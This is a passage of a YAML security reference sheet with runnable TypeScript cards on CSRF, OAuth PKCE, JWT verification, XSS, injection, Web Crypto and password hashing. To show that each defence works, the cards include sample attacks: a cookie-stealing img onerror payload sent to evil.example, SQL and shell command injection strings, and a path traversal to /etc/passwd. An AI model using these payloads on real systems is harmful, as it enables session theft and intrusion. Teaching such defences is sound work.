@@ -1,0 +1,695 @@
+id: ts-security
+concept: security.auth-and-data
+scope: platform
+title: "Security, Authentication & Privacy"
+group: "Quality & reach"
+subtitle: "Where tokens live, OAuth with PKCE and rotating refresh, verifying JWTs, XSS, injection, CSP and CSRF, Web Crypto, Argon2id, passkeys, secrets — and what never reaches a log."
+applies:
+  platforms: [browser, node]
+  runtime: a browser page and a Node.js server; Web Crypto (`crypto.subtle`) is the same API in both
+  versions: { typescript: ">=5.5", node: ">=22.18", browsers: "Baseline 2024" }
+sources:
+  - title: Web Crypto API — MDN
+    url: https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API
+  - title: RFC 10017 — OAuth 2.0 for Browser-Based Applications
+    url: https://www.rfc-editor.org/rfc/rfc10017
+  - title: OWASP Cheat Sheet Series
+    url: https://cheatsheetseries.owasp.org/
+  - title: Content Security Policy — MDN
+    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP
+cards:
+  - id: where-tokens-live
+    kind: table
+    title: Where secrets and tokens live
+    note: "Anything JavaScript can read an injected script can read, and anything sent automatically it can use, so store each secret by who must be able to read it."
+    headers: [Place, "Injected script can read it?", "Sent automatically?", "Use it for"]
+    rows:
+      - - "`HttpOnly; Secure; SameSite` cookie"
+        - "**No** (but XSS can still send requests that carry it)"
+        - "Yes, to its own site — hence CSRF defences"
+        - "The session, or the refresh token held by a backend-for-frontend (BFF)"
+      - - "A variable in memory"
+        - "Yes, while the page lives"
+        - "No"
+        - "A short-lived access token; gone on reload, re-fetched with the cookie"
+      - - "`localStorage` / `sessionStorage`"
+        - "Yes, for as long as it is stored (`localStorage`) or the tab lives (`sessionStorage`)"
+        - "No"
+        - "**Never tokens.** UI preferences; the PKCE verifier only for the redirect round trip"
+      - - "Non-extractable `CryptoKey` in IndexedDB"
+        - "Can **use** it, cannot export it"
+        - "No"
+        - "A device key for encrypting local drafts or proof-of-possession (DPoP)"
+      - - "Frontend build variables (`VITE_*`, `NEXT_PUBLIC_*`)"
+        - "Yes — they are inlined into the shipped bundle"
+        - "—"
+        - "Public identifiers only: a client ID, an analytics site key"
+      - - "Server environment / a secret manager"
+        - "Not from the browser"
+        - "—"
+        - "API keys, signing keys, database credentials — validated at startup"
+  - id: cookies-csp-csrf
+    kind: code
+    title: Session cookie, security headers and a CSRF check
+    note: "The server sets a cookie scripts cannot read, sends headers that cut XSS and framing down, and signs in or accepts a cookie-authenticated write only when the browser proves the request came from the app's own origin."
+    prerequisites: &node
+      - Node.js 22.18 or later (it runs `.mts` files directly by stripping the types)
+      - "Save as `main.mts` and run `node main.mts`"
+    code: |-
+      import { createServer, type IncomingMessage } from "node:http";
+      import { once } from "node:events";
+      import type { AddressInfo } from "node:net";
+
+      const APP_ORIGIN = "https://app.shop.example";
+      const SESSION_COOKIE = "__Host-session=opaque-random-id; HttpOnly; Secure; SameSite=Lax; Path=/";
+
+      const CSP = "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; " +
+        "frame-ancestors 'none'; require-trusted-types-for 'script'";   // the last is Baseline 2026
+
+      function mayWrite(req: IncomingMessage): boolean {
+        if (req.headers.authorization && !req.headers.cookie) return true;   // a token client: no cookie to forge
+        const site = req.headers["sec-fetch-site"];      // sent by current browsers; a page cannot forge it
+        if (site !== undefined) return site === "same-origin";
+        return req.headers.origin === APP_ORIGIN;        // older browsers; absent = unknown = refused
+      }
+
+      const server = createServer((req, res) => {
+        res.setHeader("strict-transport-security", "max-age=63072000; includeSubDomains");
+        res.setHeader("content-security-policy", CSP);
+        res.setHeader("vary", "Sec-Fetch-Site, Origin");
+        if (req.method !== "POST") {
+          res.writeHead(405, { allow: "POST" }).end();   // a link or an <img> never signs anyone in
+        } else if (!mayWrite(req)) {
+          res.writeHead(403).end();                      // checked before sign-in too: no login CSRF
+        } else {
+          if (req.url === "/session") res.setHeader("set-cookie", SESSION_COOKIE);   // POST /orders: no cookie
+          res.writeHead(req.url === "/session" ? 204 : 201).end();
+        }
+      }).listen(0, "127.0.0.1");
+      await once(server, "listening");
+      const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
+
+      const attempts: [string, string, string, Record<string, string>][] = [   // what each sender transmits
+        ["a form on evil.example", "POST", "/session", { "sec-fetch-site": "cross-site" }],
+        ["no Origin, no Sec-Fetch-Site", "POST", "/session", {}],
+        ["a link on evil.example", "GET", "/session", { "sec-fetch-site": "cross-site" }],
+        ["an API client with a token", "POST", "/orders", { authorization: "Bearer at-1" }],
+        ["our own page", "POST", "/session", { "sec-fetch-site": "same-origin" }],
+      ];
+      for (const [sender, method, path, headers] of attempts) {
+        const res = await fetch(base + path, { method, headers });
+        console.log(`${sender}: ${method} ${path} ${res.status}`, res.headers.getSetCookie()[0] ?? "(no cookie)");
+      }
+      server.close();
+    expected: |-
+      a form on evil.example: POST /session 403 (no cookie)
+      no Origin, no Sec-Fetch-Site: POST /session 403 (no cookie)
+      a link on evil.example: GET /session 405 (no cookie)
+      an API client with a token: POST /orders 201 (no cookie)
+      our own page: POST /session 204 __Host-session=opaque-random-id; HttpOnly; Secure; SameSite=Lax; Path=/
+    sources:
+      - title: Using HTTP cookies — MDN
+        url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies
+      - title: Cross-Site Request Forgery Prevention — OWASP
+        url: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+      - title: Sec-Fetch-Site — MDN
+        url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Site
+    validation: &ran
+      status: ran
+      toolchain: Node 24.16.0, TypeScript 5.9.3
+      date: "2026-11-16"
+  - id: oauth-pkce
+    kind: code
+    title: OAuth 2.0 authorization code with PKCE
+    note: "The browser keeps a random verifier for the redirect round trip and sends only its SHA-256 challenge; a stolen authorization code is useless without the verifier, `state` ties the callback to this tab, and both are deleted once used."
+    prerequisites:
+      - Node.js 22.18 or later, or a browser page (where `sessionStorage` is the real one)
+      - "Save as `main.mts` and run `node main.mts`"
+    code: |-
+      const base64url = (bytes: Uint8Array) =>
+        btoa(String.fromCharCode(...bytes)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+      const s256 = async (text: string) =>
+        base64url(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text))));
+      const random = (bytes: number) => base64url(crypto.getRandomValues(new Uint8Array(bytes)));
+
+      const memory = new Map<string, string>();         // Node has no sessionStorage: a Map stands in for it
+      const storage = globalThis.sessionStorage ?? {
+        getItem: (key: string) => memory.get(key) ?? null,
+        setItem: (key: string, value: string) => void memory.set(key, value),
+        removeItem: (key: string) => void memory.delete(key),
+      };
+
+      const CLIENT = { client_id: "shop-web", redirect_uri: "https://app.shop.example/callback" };
+
+      const verifier = random(32);                       // 1. before redirecting: 43 characters, 256 bits
+      const state = random(16);
+      storage.setItem("pkce", JSON.stringify({ verifier, state }));
+      const authorize = new URL("https://id.example/oauth2/authorize?" + new URLSearchParams({ ...CLIENT,
+        response_type: "code", scope: "openid orders:read", state, code_challenge: await s256(verifier),
+        code_challenge_method: "S256" }));
+
+      const issued = new Map([["code-789", authorize.searchParams.get("code_challenge")]]);   // the IdP, condensed
+      const tokenEndpoint = async (form: URLSearchParams) =>
+        issued.get(form.get("code") ?? "") === (await s256(form.get("code_verifier") ?? ""))
+          ? Response.json({ access_token: "at-1", refresh_token: "rt-1", expires_in: 300 })
+          : Response.json({ error: "invalid_grant" }, { status: 400 });
+
+      // 2. Back on /callback?code=…&state=…
+      async function handleCallback(url: URL, verifierOverride?: string): Promise<string> {
+        if (url.searchParams.has("error")) throw new Error(`sign-in failed: ${url.searchParams.get("error")}`);
+        const saved = JSON.parse(storage.getItem("pkce") ?? "null") as { verifier: string; state: string } | null;
+        if (!saved || url.searchParams.get("state") !== saved.state) throw new Error("state mismatch");
+        const response = await tokenEndpoint(new URLSearchParams({ ...CLIENT, grant_type: "authorization_code",
+          code: url.searchParams.get("code") ?? "", code_verifier: verifierOverride ?? saved.verifier }));
+        storage.removeItem("pkce");                      // single use, whatever the outcome
+        return response.ok ? `signed in (${response.status})` : `refused (${response.status})`;
+      }
+
+      const callback = new URL(`${CLIENT.redirect_uri}?code=code-789&state=${state}`);
+      const run = (url: URL, verifier?: string) => handleCallback(url, verifier).catch((e: Error) => e.message);
+      console.log("stolen code, guessed verifier:", await run(callback, random(32)));
+      storage.setItem("pkce", JSON.stringify({ verifier, state }));
+      console.log("our tab:", await run(callback));
+      console.log("replayed callback:", await run(callback));
+      console.log("user cancelled:", await run(new URL(`${CLIENT.redirect_uri}?error=access_denied`)));
+    expected: |-
+      stolen code, guessed verifier: refused (400)
+      our tab: signed in (200)
+      replayed callback: state mismatch
+      user cancelled: sign-in failed: access_denied
+    sources:
+      - title: RFC 7636 — Proof Key for Code Exchange
+        url: https://www.rfc-editor.org/rfc/rfc7636
+      - title: RFC 9700 — Best Current Practice for OAuth 2.0 Security
+        url: https://www.rfc-editor.org/rfc/rfc9700
+    validation: *ran
+  - id: refresh-token-rotation
+    kind: code
+    title: Refresh tokens that rotate on every use
+    note: "Per RFC 10017 a browser client's refresh token must rotate on each use or be sender-constrained (DPoP) and must expire after a maximum or idle lifetime, unless it never reaches the browser at all (a BFF) — the REST sheet's single-flight card shows the client side of a 401."
+    prerequisites: &zod
+      - Node.js 22.18 or later (it runs `.mts` files directly by stripping the types)
+      - "`npm i zod`"
+      - "Save as `main.mts` and run `node main.mts`"
+    code: |-
+      import { z } from "zod";
+
+      // The identity provider's side, condensed: one family per sign-in, one live token per family.
+      type Family = { live: string; revoked: boolean };
+
+      const families = new Map<string, Family>([["rt-0", { live: "rt-0", revoked: false }]]);
+      let issued = 0;
+
+      function tokenEndpoint(form: URLSearchParams): Response {
+        const presented = form.get("refresh_token") ?? "";
+        const family = families.get(presented);
+        if (family && family.live !== presented) family.revoked = true;   // reuse = a stolen copy: kill the family
+        if (!family || family.revoked) return Response.json({ error: "invalid_grant" }, { status: 400 });
+        family.live = `rt-${++issued}`;
+        families.set(family.live, family);
+        return Response.json({ access_token: `at-${issued}`, refresh_token: family.live, expires_in: 300 });
+      }
+
+      // The client's side: a BFF, or a SPA that keeps the refresh token in memory only.
+      const Tokens = z.object({ access_token: z.string(), refresh_token: z.string(), expires_in: z.number() });
+
+      async function refresh(refreshToken: string) {
+        const response = tokenEndpoint(new URLSearchParams({
+          grant_type: "refresh_token", refresh_token: refreshToken, client_id: "shop-web",
+        }));
+        if (!response.ok) throw new Error(`signed out (${response.status}): send the user to sign-in`);
+        return Tokens.parse(await response.json());
+      }
+
+      const first = await refresh("rt-0");
+      const second = await refresh(first.refresh_token);
+      console.log("legitimate:", first.refresh_token, "->", second.refresh_token);
+
+      await refresh("rt-0").catch((e: Error) => console.log("attacker replays rt-0:", e.message));
+      await refresh(second.refresh_token).catch((e: Error) => console.log("victim, next refresh:", e.message));
+    expected: |-
+      legitimate: rt-1 -> rt-2
+      attacker replays rt-0: signed out (400): send the user to sign-in
+      victim, next refresh: signed out (400): send the user to sign-in
+    sources:
+      - title: RFC 9700 — Refresh token protection (section 4.14)
+        url: https://www.rfc-editor.org/rfc/rfc9700
+    validation: *ran
+  - id: verify-jwt
+    kind: code
+    title: Verify a JWT with jose
+    note: "Decoding is not verifying: an API trusts a token only after a vetted library has checked the signature against the issuer's keys, an algorithm the API chose, the token type, `iss`, `aud`, `exp`, `nbf` and the claims it requires."
+    prerequisites:
+      - Node.js 22.18 or later (it runs `.mts` files directly by stripping the types)
+      - "`npm i jose`"
+      - "Save as `main.mts` and run `node main.mts`"
+    code: |-
+      import { SignJWT, createLocalJWKSet, exportJWK, generateKeyPair, jwtVerify } from "jose";
+
+      // Stand-in identity provider: an ES256 key and the JWKS it publishes.
+      const { privateKey, publicKey } = await generateKeyPair("ES256");
+      const jwks = createLocalJWKSet({ keys: [{ ...(await exportJWK(publicKey)), kid: "2026-11", alg: "ES256" }] });
+      // In production: createRemoteJWKSet(new URL("https://id.example/.well-known/jwks.json")), cached by kid
+
+      const now = 1_800_000_000;                       // injected clock, in seconds
+      const claims = { iss: "https://id.example", aud: "orders-api", sub: "user-42", exp: now + 300 };
+      const sign = (payload: object, typ = "at+jwt") =>
+        new SignJWT({ ...payload }).setProtectedHeader({ alg: "ES256", kid: "2026-11", typ }).sign(privateKey);
+
+      async function authenticate(token: string, atSeconds = now): Promise<string | undefined> {
+        const { payload } = await jwtVerify(token, jwks, {
+          algorithms: ["ES256"],                       // the token never picks its own algorithm
+          issuer: "https://id.example",
+          audience: "orders-api",
+          typ: "at+jwt",                               // an access token, not an ID token replayed (RFC 9068)
+          requiredClaims: ["exp", "sub"],
+          clockTolerance: 30,
+          currentDate: new Date(atSeconds * 1000),
+        });
+        return payload.sub;
+      }
+
+      const good = await sign(claims);
+      const [header, , signature] = good.split(".");
+      const { exp: _exp, ...noExp } = claims;
+      const forgedBody = Buffer.from(JSON.stringify({ ...claims, sub: "admin" })).toString("base64url");
+      const cases: [string, string, number?][] = [
+        ["valid", good],
+        ["aud as an array", await sign({ ...claims, aud: ["orders-api", "billing"] })],
+        ["no exp", await sign(noExp)],
+        ["an hour later", good, now + 3600],
+        ["wrong audience", await sign({ ...claims, aud: "billing" })],
+        ["an ID token", await sign(claims, "JWT")],
+        ["edited payload", `${header}.${forgedBody}.${signature}`],
+        ["alg none", `${Buffer.from('{"alg":"none"}').toString("base64url")}.${forgedBody}.`],
+      ];
+      for (const [label, token, at] of cases) {
+        console.log(`${label}:`, await authenticate(token, at).catch((e: Error) => `refused — ${e.message}`));
+      }
+    expected: |-
+      valid: user-42
+      aud as an array: user-42
+      no exp: refused — missing required "exp" claim
+      an hour later: refused — "exp" claim timestamp check failed
+      wrong audience: refused — unexpected "aud" claim value
+      an ID token: refused — unexpected "typ" JWT header value
+      edited payload: refused — signature verification failed
+      alg none: refused — "alg" (Algorithm) Header Parameter value not allowed
+    applies:
+      platforms: [node]
+      runtime: Node.js 22.18+ (the API server)
+      versions: { typescript: ">=5.5", node: ">=22.18", jose: ">=6.0" }
+    sources:
+      - title: jose — GitHub
+        url: https://github.com/panva/jose
+      - title: RFC 8725 — JSON Web Token Best Current Practices
+        url: https://www.rfc-editor.org/rfc/rfc8725
+      - title: RFC 9068 — JWT Profile for OAuth 2.0 Access Tokens
+        url: https://www.rfc-editor.org/rfc/rfc9068
+    validation: *ran
+  - id: xss-output-handling
+    kind: code
+    title: "XSS: text is not markup"
+    note: "Anything a user typed goes into the page as text (`textContent`) and into links only after a scheme check, while HTML strings come only from a sanitiser that Trusted Types can enforce."
+    prerequisites:
+      - Node.js 22.18 or later (it runs `.mts` files directly by stripping the types)
+      - "`npm i jsdom` (only to have a DOM in Node — in a browser the same functions run on `document`)"
+      - "Save as `main.mts` and run `node main.mts`"
+    code: |-
+      import { JSDOM } from "jsdom";
+
+      const { document } = new JSDOM(`<ul id="reviews"></ul>`).window;
+      const list = document.querySelector("#reviews")!;
+      const review = {
+        author: "Mallory",
+        text: `Nice mug <img src=x onerror="fetch('//evil.example?c='+document.cookie)">`,
+        site: "javascript:alert(1)",
+      };
+
+      function renderUnsafe(r: typeof review) {
+        list.insertAdjacentHTML("beforeend", `<li>${r.author}: ${r.text}</li>`);   // the markup runs
+      }
+
+      function safeHref(url: string): string | null {
+        try {
+          const parsed = new URL(url, "https://app.shop.example");
+          return parsed.protocol === "https:" || parsed.protocol === "http:" ? parsed.href : null;
+        } catch {
+          return null;
+        }
+      }
+
+      function renderSafe(r: typeof review) {
+        const item = document.createElement("li");
+        const link = document.createElement("a");
+        link.textContent = r.author;                     // text, whatever it contains
+        const href = safeHref(r.site);
+        if (href) link.href = href;                      // no javascript: URLs
+        item.append(link, `: ${r.text}`);                // a string argument becomes a text node
+        list.append(item);
+      }
+
+      renderUnsafe(review);
+      console.log("unsafe: <img onerror> elements =", list.querySelectorAll("img[onerror]").length);
+      list.replaceChildren();
+      renderSafe(review);
+      const href = list.querySelector("a")!.getAttribute("href");
+      console.log("safe: elements =", list.querySelectorAll("img").length, "| link href =", href);
+      console.log("safe: shown as", JSON.stringify(list.textContent!.slice(0, 22) + "…"));
+    expected: |-
+      unsafe: <img onerror> elements = 1
+      safe: elements = 0 | link href = null
+      safe: shown as "Mallory: Nice mug <img…"
+    applies:
+      platforms: [browser, node]
+      versions: { typescript: ">=5.5", node: ">=22.18", jsdom: ">=24" }
+    sources:
+      - title: Cross Site Scripting Prevention — OWASP
+        url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+      - title: Trusted Types API — MDN
+        url: https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
+    validation: *ran
+  - id: injection-sql-shell-path
+    kind: code
+    title: "Injection: parameters, argv and contained paths"
+    note: "On the server input is data, never code: bind SQL values as parameters, pass program arguments as an array instead of a shell string, and resolve file names inside a fixed directory."
+    prerequisites:
+      - Node.js 22.18 or later (type stripping; on Node 22 `node:sqlite` prints an ExperimentalWarning), on macOS or Linux (the demo calls `echo`)
+      - "Save as `main.mts` and run `node main.mts`"
+    code: |-
+      import { DatabaseSync } from "node:sqlite";   // Node 22 prints an ExperimentalWarning for it: expected
+      import { exec, execFile } from "node:child_process";
+      import { promisify } from "node:util";
+      import path from "node:path";
+
+      const db = new DatabaseSync(":memory:");
+      db.exec("CREATE TABLE orders (id TEXT, owner TEXT)");
+      db.exec("INSERT INTO orders VALUES ('o-1', 'ana'), ('o-2', 'ben')");
+      const owner = "ana' OR '1'='1";                    // from ?owner= in the URL
+
+      // The same `?` (or `$1`) binding works with pg, mysql2 and better-sqlite3.
+      const spliced = db.prepare(`SELECT id FROM orders WHERE owner = '${owner}'`).all();
+      const bound = db.prepare("SELECT id FROM orders WHERE owner = ?").all(owner);   // a value, never SQL
+      console.log("SQL spliced:", spliced.length, "rows | parameter:", bound.length, "rows");
+
+      const upload = "invoice.pdf; echo PWNED";           // an uploaded file's name
+      const shell = await promisify(exec)(`echo converting ${upload}`);              // a shell parses this
+      const argv = await promisify(execFile)("echo", ["converting", upload]);       // no shell at all
+      console.log("shell:", JSON.stringify(shell.stdout), "| argv:", JSON.stringify(argv.stdout));
+
+      const UPLOADS = path.resolve("/srv/uploads");
+
+      // A lexical check: if the folder can hold symlinks, fs.realpath the result before comparing.
+      function insideUploads(name: string): string {
+        const full = path.resolve(UPLOADS, name);
+        if (!full.startsWith(UPLOADS + path.sep)) throw new Error(`refused path ${JSON.stringify(name)}`);
+        return full;
+      }
+
+      console.log(insideUploads("o-1/invoice.pdf"));
+      try {
+        insideUploads("../../etc/passwd");
+      } catch (e) {
+        console.log((e as Error).message);
+      }
+    expected: |-
+      SQL spliced: 2 rows | parameter: 0 rows
+      shell: "converting invoice.pdf\nPWNED\n" | argv: "converting invoice.pdf; echo PWNED\n"
+      /srv/uploads/o-1/invoice.pdf
+      refused path "../../etc/passwd"
+    applies:
+      platforms: [node]
+      runtime: Node.js 22.18+ on macOS or Linux
+      versions: { typescript: ">=5.5", node: ">=22.18" }
+    sources:
+      - title: SQL Injection Prevention — OWASP
+        url: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+      - title: OS Command Injection Defense — OWASP
+        url: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+      - title: SQLite — Node.js documentation
+        url: https://nodejs.org/api/sqlite.html
+    validation: *ran
+  - id: web-crypto-aes-sha
+    kind: code
+    title: "Web Crypto: AES-GCM encryption and SHA-256"
+    note: "Encrypt a local draft with a non-extractable key and a fresh 12-byte IV (GCM rejects a tampered byte) and hash to fingerprint content, remembering that a page-held key protects data at rest, not from script running in the page."
+    prerequisites: *node
+    code: |-
+      const encoder = new TextEncoder();
+      const hex = (buffer: ArrayBuffer) =>
+        [...new Uint8Array(buffer)].map((b) => b.toString(16).padStart(2, "0")).join("");
+
+      // false = non-extractable: scripts can use the key, never read its bytes (IndexedDB can store it)
+      const key = await crypto.subtle.generateKey({ name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"]);
+
+      type Sealed = { iv: Uint8Array<ArrayBuffer>; data: Uint8Array<ArrayBuffer> };
+
+      async function seal(plaintext: string): Promise<Sealed> {
+        const iv = crypto.getRandomValues(new Uint8Array(12));   // never reuse an IV with the same key
+        const data = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, encoder.encode(plaintext));
+        return { iv, data: new Uint8Array(data) };
+      }
+
+      async function open({ iv, data }: Sealed): Promise<string> {
+        return new TextDecoder().decode(await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data));
+      }
+
+      const note = "Ship order o-1 to 12 Rose Lane";
+      const draft = await seal(note);
+      console.log(await open(draft));
+      console.log("ciphertext = plaintext + 16-byte tag:", draft.data.length === encoder.encode(note).length + 16);
+
+      draft.data[0]! ^= 1;                               // tamper with one bit
+      await open(draft).catch((e: DOMException) => console.log("tampered:", e.name));
+
+      const exportFile = encoder.encode("orders-2026-11.csv contents");
+      console.log("sha-256:", hex(await crypto.subtle.digest("SHA-256", exportFile)));
+    expected: |-
+      Ship order o-1 to 12 Rose Lane
+      ciphertext = plaintext + 16-byte tag: true
+      tampered: OperationError
+      sha-256: 1d00b16a21196b21cdf3c0437c5d8f05282e816684d3f9547b905e1050ccef08
+    applies:
+      platforms: [browser, node]
+      versions: { typescript: ">=5.7", node: ">=22.18", browsers: "Baseline 2024" }
+    sources:
+      - title: "SubtleCrypto: encrypt() — MDN"
+        url: https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/encrypt
+      - title: "SubtleCrypto: digest() — MDN"
+        url: https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest
+    validation: *ran
+  - id: password-hashing-server
+    kind: code
+    title: "Passwords: a slow, salted KDF on the server"
+    note: "Store passwords with a slow, salted KDF — here scrypt at OWASP's minimum, N=2^17, r=8, p=1, which needs `maxmem` above Node's 32 MiB default — in a PHC-style string, compared in constant time, failing closed on a corrupt record and re-hashed when the parameters change."
+    prerequisites:
+      - Node.js 22.18 or later (it runs `.mts` files directly by stripping the types)
+      - "Save as `main.mts` and run `node main.mts`"
+    code: |-
+      import { scrypt, randomBytes, timingSafeEqual } from "node:crypto";
+
+      // Prefer Argon2id where you have it (OWASP: m=19 MiB, t=2, p=1): crypto.argon2("argon2id", …) on
+      // Node 24.7+ ("Stability: 1.2 - Release candidate"), or the argon2 npm package on Node 22.
+      type Params = { log2N: number; r: number; p: number };
+      const CURRENT: Params = { log2N: 17, r: 8, p: 1 };   // OWASP's scrypt minimum: N=2^17, r=8, p=1 (128 MiB)
+      const MAXMEM = 256 * 1024 * 1024;                    // Node's 32 MiB default would throw for these
+      const b64 = (bytes: Buffer) => bytes.toString("base64").replace(/=+$/, "");
+
+      function derive(password: string, salt: Buffer, { log2N, r, p }: Params): Promise<Buffer> {
+        return new Promise((resolve, reject) => {
+          const options = { N: 2 ** log2N, r, p, maxmem: MAXMEM };
+          scrypt(password.normalize("NFKC"), salt, 32, options, (err, key) => (err ? reject(err) : resolve(key)));
+        });
+      }
+
+      async function hashPassword(password: string, params = CURRENT): Promise<string> {
+        const salt = randomBytes(16);                      // unique per user: equal passwords hash differently
+        const key = await derive(password, salt, params);
+        return `$scrypt$ln=${params.log2N},r=${params.r},p=${params.p}$${b64(salt)}$${b64(key)}`;   // PHC style
+      }
+
+      const STORED = /^\$scrypt\$ln=(\d+),r=(\d+),p=(\d+)\$([A-Za-z0-9+/]{22})\$([A-Za-z0-9+/]{43})$/;
+
+      async function verifyPassword(password: string, stored: string) {
+        const m = STORED.exec(stored);
+        if (!m) return { ok: false, rehash: false };      // corrupt or foreign record: a failed login, not a crash
+        const params = { log2N: Number(m[1]), r: Number(m[2]), p: Number(m[3]) };
+        const key = await derive(password, Buffer.from(m[4]!, "base64"), params).catch(() => null);
+        const ok = key !== null && timingSafeEqual(key, Buffer.from(m[5]!, "base64"));   // both 32 bytes
+        const outdated = params.log2N < CURRENT.log2N || params.r < CURRENT.r || params.p < CURRENT.p;
+        return { ok, rehash: ok && outdated };            // re-hash with CURRENT while the password is at hand
+      }
+
+      const pass = "correct horse battery staple";
+      const stored = await hashPassword(pass);
+      console.log(stored.startsWith("$scrypt$ln=17,r=8,p=1$"), "| salted:", stored !== (await hashPassword(pass)));
+      console.log("right:", await verifyPassword(pass, stored));
+      console.log("wrong:", await verifyPassword(pass + "r", stored));
+      console.log("corrupt:", await verifyPassword(pass, stored.slice(0, -5)));
+      const legacy = await hashPassword(pass, { log2N: 14, r: 8, p: 1 });   // last year's setting
+      console.log("old parameters:", await verifyPassword(pass, legacy));
+    expected: |-
+      true | salted: true
+      right: { ok: true, rehash: false }
+      wrong: { ok: false, rehash: false }
+      corrupt: { ok: false, rehash: false }
+      old parameters: { ok: true, rehash: true }
+    applies:
+      platforms: [node]
+      runtime: Node.js 22.18+ (a server — never hash passwords only in the browser)
+      versions: { typescript: ">=5.5", node: ">=22.18" }
+    sources:
+      - title: Password Storage — OWASP
+        url: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
+      - title: crypto.scrypt — Node.js documentation
+        url: https://nodejs.org/api/crypto.html#cryptoscryptpassword-salt-keylen-options-callback
+      - title: crypto.argon2 — Node.js documentation
+        url: https://nodejs.org/api/crypto.html#cryptoargon2algorithm-parameters-callback
+    validation: *ran
+  - id: passkeys-webauthn
+    kind: code
+    title: Passkeys with WebAuthn, in outline
+    note: "The server issues a one-time challenge as JSON, the browser asks the authenticator (Face ID, Windows Hello, a security key), and the server verifies the signed response, so no shared secret ever exists (the JSON helpers are Baseline 2025)."
+    prerequisites:
+      - "A page served over HTTPS (or `localhost`) whose origin matches the relying-party ID"
+      - "A server that creates and verifies WebAuthn options — e.g. with `@simplewebauthn/server` — at `/webauthn/*`"
+      - "An `<input autocomplete=\"username webauthn\">` on the sign-in page for passkey autofill"
+    code: |-
+      async function postJson(path: string, body: unknown = {}): Promise<any> {
+        const response = await fetch(path, {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify(body),
+        });
+        if (!response.ok) throw new Error(`${path}: HTTP ${response.status}`);
+        return response.json();
+      }
+
+      export async function registerPasskey(): Promise<void> {
+        const options = await postJson("/webauthn/register/options");   // rp, user, challenge, algorithms
+        const credential = await navigator.credentials.create({
+          publicKey: PublicKeyCredential.parseCreationOptionsFromJSON(options),
+        });
+        if (!(credential instanceof PublicKeyCredential)) throw new Error("registration cancelled");
+        await postJson("/webauthn/register/verify", credential.toJSON());   // the server stores the public key
+      }
+
+      export async function signInWithPasskey(signal: AbortSignal): Promise<void> {
+        const options = await postJson("/webauthn/login/options");
+        const conditional = await PublicKeyCredential.isConditionalMediationAvailable?.();
+        const credential = await navigator.credentials.get({
+          publicKey: PublicKeyCredential.parseRequestOptionsFromJSON(options),
+          mediation: conditional ? "conditional" : "optional",   // conditional: offered in username autofill
+          signal,
+        });
+        if (!(credential instanceof PublicKeyCredential)) throw new Error("sign-in cancelled");
+        await postJson("/webauthn/login/verify", credential.toJSON());   // signature, challenge, origin checked
+      }
+    expected: "Registration stores a passkey on the user's device; afterwards the username field offers it in autofill and signing in needs only the device's biometric or PIN."
+    applies:
+      platforms: [browser]
+      runtime: a browser page over HTTPS
+      versions: { typescript: ">=5.5", browsers: "Baseline 2025" }
+    sources:
+      - title: Web Authentication API — MDN
+        url: https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
+      - title: "PublicKeyCredential: parseRequestOptionsFromJSON() — MDN"
+        url: https://developer.mozilla.org/en-US/docs/Web/API/PublicKeyCredential/parseRequestOptionsFromJSON_static
+      - title: Passkeys — web.dev
+        url: https://web.dev/articles/passkey-registration
+    validation:
+      status: compiled
+      toolchain: Node 24.16.0, TypeScript 5.9.3
+      date: "2026-11-16"
+      host: a browser page over HTTPS with a passkey-capable authenticator and a WebAuthn server
+  - id: secrets-validation-redaction
+    kind: code
+    title: Secrets in config, validation at the boundary, redaction in the logger
+    note: "Read secrets from the server's environment and validate them once at startup, validate every request body before it touches the domain, and redact inside the logger (pino's `redact` paths, or better an allowlist of loggable fields) so no call site can forget."
+    prerequisites:
+      - Node.js 22.18 or later (it runs `.mts` files directly by stripping the types)
+      - "`npm i zod`"
+      - "Save as `main.mts` and run `node main.mts` (in production pass `process.env` to `loadConfig`)"
+    code: |-
+      import { z } from "zod";
+
+      const Config = z.object({
+        DATABASE_URL: z.url(),
+        PAYMENT_API_KEY: z.string().min(20),             // server-only: never prefixed VITE_ / NEXT_PUBLIC_
+      });
+
+      function loadConfig(env: Record<string, string | undefined>) {
+        const result = Config.safeParse(env);
+        const names = result.error?.issues.map((i) => i.path.join(".")).join(", ");   // names, never values
+        if (!result.success) throw new Error(`invalid config: ${names}`);
+        return result.data;
+      }
+
+      const SignUp = z.strictObject({                    // unknown keys rejected: no `isAdmin: true` smuggled in
+        email: z.email(),
+        displayName: z.string().trim().min(1).max(50),
+        password: z.string().min(12).max(200),
+      });
+
+      const SENSITIVE = /pass|token|secret|authorization|cookie|key|email/i;
+      function redact(value: unknown): unknown {
+        if (Array.isArray(value)) return value.map(redact);
+        if (value === null || typeof value !== "object") return value;
+        const entries = Object.entries(value).map(([k, v]) => [k, SENSITIVE.test(k) ? "[redacted]" : redact(v)]);
+        return Object.fromEntries(entries);
+      }
+
+      const log = (event: string, data: object) =>      // every log line goes through here
+        console.log(JSON.stringify({ event, ...(redact(data) as object) }));
+
+      try {
+        loadConfig({ DATABASE_URL: "postgres://db.internal/shop", PAYMENT_API_KEY: "sk_short" });
+      } catch (e) {
+        console.log((e as Error).message);
+      }
+
